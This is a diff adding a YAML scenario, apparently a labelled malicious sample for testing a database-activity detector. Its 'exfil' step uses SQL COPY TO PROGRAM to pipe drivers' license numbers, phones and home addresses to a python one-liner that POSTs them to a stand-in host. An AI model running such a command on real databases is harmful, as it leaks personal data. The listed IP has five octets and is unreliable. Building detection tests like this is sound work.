@@ -1,0 +1,31 @@
+scenario_id: gen_logistics_41_copy_to_program_mal_1051m
+family_id: gen_logistics_41_copy_to_program_fam_1051
+domain: logistics
+time_of_day: 03:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT license_number, phone, home_address FROM drivers) TO PROGRAM
+      'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://clearinghouse-batch.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 176.65.48.45.122
+      port: 443
+matched_pair_id: gen_logistics_41_copy_to_program_pair_1051
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
